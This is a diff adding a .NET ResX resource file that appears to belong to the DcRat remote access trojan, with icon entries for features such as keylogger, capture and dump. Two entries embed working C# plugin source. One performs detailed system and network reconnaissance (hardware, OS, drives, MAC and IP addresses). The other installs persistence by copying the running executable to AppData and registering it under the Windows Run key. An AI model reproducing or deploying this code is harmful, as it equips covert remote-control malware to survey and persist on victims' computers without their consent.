@@ -1,0 +1,935 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="about" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\about.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="about_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\about_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="add" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\add.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="add_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\add_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="back" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\back.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="back_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\back_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="builder" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\builder.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="builder_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\builder_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="capture" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\capture.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="capture_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\capture_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="change" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\change.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="change_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\change_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="close" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\close.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="close_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\close_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="cmd" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\cmd.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="cmd_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\cmd_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="copy" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\copy.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="copy_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\copy_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="create" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\create.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="create_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\create_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="cut" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\cut.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="cut_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\cut_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="DcRat" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\DcRat.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="DcRatIcon" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\DcRatIcon.ico;System.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="DcRat_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\DcRat_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="delete" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\delete.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="delete_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\delete_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="detaillist" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\detaillist.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="detaillist_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\detaillist_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="device" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\device.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="device_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\device_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="download" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\download.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="download_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\download_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="dump" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\dump.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="dump_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\dump_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="file" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\file.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="file_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\file_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="file_zip" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\file_zip.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="file_zip_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\file_zip_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="folder" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\folder.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="GeoLite2_City" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\GeoLite2-City.mmdb;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="goto" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\goto.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="goto_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\goto_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="HDD" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\HDD.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="home" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\home.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="home_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\home_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="iconlist" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\iconlist.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="iconlist_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\iconlist_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="info" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\info.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Information" xml:space="preserve">
+    <value>using Microsoft.VisualBasic.Devices;
+using System;
+using System.IO;
+using System.Linq;
+using System.Management;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            try
+            {
+                return new string[] { "Message", GetMessage() };
+            }
+            catch (Exception ex)
+            {
+                return new string[] { "Log", ex .Message};
+            }
+        }
+
+        [DllImport("kernel32.dll", EntryPoint = "GetFirmwareEnvironmentVariableW", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
+        public static extern int GetFirmwareType(string lpName, string lpGUID, IntPtr pBuffer, uint size);
+
+
+        static string GetMessage()
+        {
+            StringBuilder sb = new StringBuilder();
+            ComputerInfo computerInfo = new ComputerInfo();
+
+            sb.AppendFormat("{0,-30}", "Host Name:");
+            sb.AppendLine(Environment.MachineName);
+            sb.AppendFormat("{0,-30}", "OS Name:");
+            sb.AppendLine(computerInfo.OSFullName);
+
+            using (ManagementObject wmi = new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get().Cast&lt;ManagementObject&gt;().First())
+            {
+                sb.AppendFormat("{0,-30}", "OS Version:");
+                sb.AppendLine(wmi["Version"] + " Build " + wmi["BuildNumber"]);
+                sb.AppendFormat("{0,-30}", "OS Architecture:");
+                sb.AppendLine(wmi["OSArchitecture"].ToString());
+                sb.AppendFormat("{0,-30}", "OS Language:");
+                foreach (var item in (string[])wmi["MUILanguages"])
+                {
+                    sb.Append(item.ToString() + "|");
+                }
+                sb.Remove(sb.Length - 1, 1);
+                sb.AppendLine();
+                sb.AppendFormat("{0,-30}", "OS Architecture:");
+                sb.AppendLine(wmi["OSArchitecture"].ToString());
+
+            }
+
+            sb.AppendLine();
+            try
+            {
+                using (ManagementObject Mobject = new ManagementClass("Win32_BIOS").GetInstances().OfType&lt;ManagementObject&gt;().FirstOrDefault())
+                {
+                    sb.AppendFormat("{0,-30}", "BIOS Version:");
+                    sb.AppendLine((string)Mobject["Manufacturer"] + " " + (string)Mobject["SMBIOSBIOSVersion"] + " " + ManagementDateTimeConverter.ToDateTime((string)Mobject["ReleaseDate"]).ToString("yyyy/MM/dd"));
+                }
+                sb.AppendFormat("{0,-30}", "Bios Mode:");
+                sb.AppendLine((GetFirmwareType("", "{00000000-0000-0000-0000-000000000000}", IntPtr.Zero, 0) == 1) ? "BIOS" : "UEFI");
+            }
+            catch { }
+            try
+            {
+                using (ManagementObjectCollection hardDiskC = new ManagementClass("Win32_ComputerSystemProduct").GetInstances())
+                {
+                    sb.AppendFormat("{0,-30}", "Computer Model:");
+                    sb.AppendLine(hardDiskC.OfType&lt;ManagementObject&gt;().FirstOrDefault()["Name"].ToString());
+                }
+                sb.AppendFormat("{0,-30}", "Boot Mode:");
+                sb.AppendLine(SystemInformation.BootMode.ToString());
+            }
+            catch { }
+
+            sb.AppendLine();
+
+            try 
+            {
+                using (ManagementObjectSearcher mos = new ManagementObjectSearcher("Select * from Win32_Processor"))
+                {
+                    foreach (ManagementObject mo in mos.Get())
+                    {
+                        sb.AppendFormat("{0,-30}", "CPU Name:");
+                        sb.AppendLine(mo["Name"].ToString());
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine("(" + mo["NumberOfCores"].ToString() + " Cores  " + mo["NumberOfLogicalProcessors"].ToString() + " Processors  VT " + ((bool)mo["VirtualizationFirmwareEnabled"] ? "Enable)" : "Disable)"));
+                    }
+                }
+            }
+            catch { }
+
+            try
+            {
+                using (ManagementObjectSearcher Search = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
+                {
+                    ManagementObject Mobject = Search.Get().OfType&lt;ManagementObject&gt;().FirstOrDefault();
+                    sb.AppendFormat("{0,-30}", "RAM Size:");
+                    sb.AppendLine((((Convert.ToDouble(Mobject["TotalPhysicalMemory"]) / 1073741824) &gt; 1) ? Math.Ceiling(Convert.ToDouble(Mobject["TotalPhysicalMemory"]) / 1073741824).ToString() : (Convert.ToDouble(Mobject["TotalPhysicalMemory"]) / 1073741824).ToString()) + " GB");
+
+                }
+            }
+            catch { }
+
+            sb.AppendLine();
+            try
+            {
+
+                DriveInfo[] allDrives = DriveInfo.GetDrives();
+                sb.AppendFormat("{0,-30}", "DriveInfo:");
+                sb.AppendLine();
+                foreach (DriveInfo d in allDrives)
+                {
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(d.Name);
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Drive type..................: {0}", d.DriveType));
+                    if (d.IsReady == true)
+                    {
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine(string.Format("  Volume label................: {0}", d.VolumeLabel));
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine(string.Format("  File system.................: {0}", d.DriveFormat));
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine(string.Format("  Available space.............: {0} GB", d.TotalFreeSpace / 1024 / 1024 / 1024));
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine(string.Format("  Total size..................: {0} GB ", d.TotalSize / 1024 / 1024 / 1024));
+                        sb.AppendLine();
+                    }
+                }
+
+                sb.AppendLine();
+            }
+            catch { }
+
+            try
+            {
+                ManagementObjectSearcher objvide = new ManagementObjectSearcher("select * from Win32_VideoController");
+                sb.AppendFormat("{0,-30}", "VideoController:");
+                sb.AppendLine();
+                foreach (ManagementObject obj in objvide.Get())
+                {
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("Name: " + obj["Name"]));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("DriverVersion: " + obj["DriverVersion"]));
+                    sb.AppendLine();
+                }
+
+                sb.AppendLine();
+            }
+            catch { }
+
+            try
+            {
+                sb.AppendFormat("{0,-30}", "Interface:");
+
+                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
+                if (nics == null || nics.Length &lt; 1)
+                {
+                    sb.AppendLine("  No network interfaces found.");
+                }
+                else
+                {
+                    sb.AppendLine(string.Format("Number of interfaces .................... : {0}", nics.Length));
+                }
+
+                foreach (NetworkInterface adapter in nics)
+                {
+                    IPInterfaceProperties properties = adapter.GetIPProperties();
+                    sb.AppendLine();
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(adapter.Description);
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(String.Empty.PadLeft(adapter.Description.Length, '='));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Interface type ........................ : {0}", adapter.NetworkInterfaceType));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Physical Address ...................... : {0}",
+                               adapter.GetPhysicalAddress().ToString()));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Operational status .................... : {0}",
+                        adapter.OperationalStatus));
+
+                    string versions = "";
+                    if (adapter.Supports(NetworkInterfaceComponent.IPv4))
+                    {
+                        versions = "IPv4 ";
+                    }
+                    if (adapter.Supports(NetworkInterfaceComponent.IPv6))
+                    {
+                        versions += "IPv6";
+                    }
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  IP version ............................ : {0}", versions));
+
+                    if (adapter.NetworkInterfaceType == NetworkInterfaceType.Loopback)
+                    {
+                        continue;
+                    }
+                    UnicastIPAddressInformationCollection UnicastIPAddressInformationCollection = properties.UnicastAddresses;
+                    foreach (UnicastIPAddressInformation UnicastIPAddressInformation in UnicastIPAddressInformationCollection)
+                    {
+                        if (UnicastIPAddressInformation.Address.AddressFamily.ToString() == ProtocolFamily.InterNetwork.ToString())
+                        {
+                            sb.AppendFormat("{0,-30}", "");
+                            sb.AppendLine("  IPV4 Address .......................... : " + UnicastIPAddressInformation.Address.ToString());
+                        }
+
+                    }
+                    foreach (UnicastIPAddressInformation UnicastIPAddressInformation in UnicastIPAddressInformationCollection)
+                    {
+                        if (UnicastIPAddressInformation.Address.AddressFamily.ToString() == ProtocolFamily.InterNetworkV6.ToString())
+                        {
+                            sb.AppendFormat("{0,-30}", "");
+                            sb.AppendLine("  IPV6 Address .......................... : " + UnicastIPAddressInformation.Address.ToString());
+                        }
+
+                    }
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  DNS suffix ............................ : {0}",
+                        properties.DnsSuffix));
+
+                    string label;
+                    if (adapter.Supports(NetworkInterfaceComponent.IPv4))
+                    {
+                        IPv4InterfaceProperties ipv4 = properties.GetIPv4Properties();
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine(string.Format("  MTU.................................... : {0}", ipv4.Mtu));
+
+                        sb.AppendFormat("{0,-30}", "");
+                        sb.AppendLine(string.Format("  DHCP Enabled........................... : {0}", ipv4.IsDhcpEnabled));
+                        if (ipv4.UsesWins)
+                        {
+                            IPAddressCollection winsServers = properties.WinsServersAddresses;
+                            if (winsServers.Count &gt; 0)
+                            {
+                                label = "  WINS Servers .......................... :";
+                                sb.AppendFormat("{0,-30}", "");
+                                sb.AppendLine(string.Format(label, winsServers));
+                            }
+                        }
+                    }
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  DNS enabled ........................... : {0}",
+                        properties.IsDnsEnabled));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Dynamically configured DNS ............ : {0}",
+                        properties.IsDynamicDnsEnabled));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Receive Only .......................... : {0}",
+                        adapter.IsReceiveOnly));
+                    sb.AppendFormat("{0,-30}", "");
+                    sb.AppendLine(string.Format("  Multicast ............................. : {0}",
+                        adapter.SupportsMulticast));
+
+                    sb.AppendLine();
+                }
+            }
+            catch { }
+            return sb.ToString();
+        }
+    }
+}</value>
+  </data>
+  <data name="info_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\info_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Install" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.IO;
+using Microsoft.Win32;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            string installPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            if (!Directory.Exists(installPath))
+                Directory.CreateDirectory(installPath);
+            string path = Path.Combine(installPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
+            if (!File.Exists(path))
+                File.Copy(Process.GetCurrentProcess().MainModule.FileName, path);
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", RegistryKeyPermissionCheck.ReadWriteSubTree))
+            {
+                key.SetValue(Path.GetFileNameWithoutExtension(installPath), path);
+            }
+
+            return new string[] { "Null", "" };
+        }
+    }
+}</value>
+  </data>
+  <data name="jump" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\jump.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="jump_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\jump_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="keyboard" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\keyboard.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="keyboard_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\keyboard_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="keylogger" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\keylogger.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="keylogger_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\keylogger_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
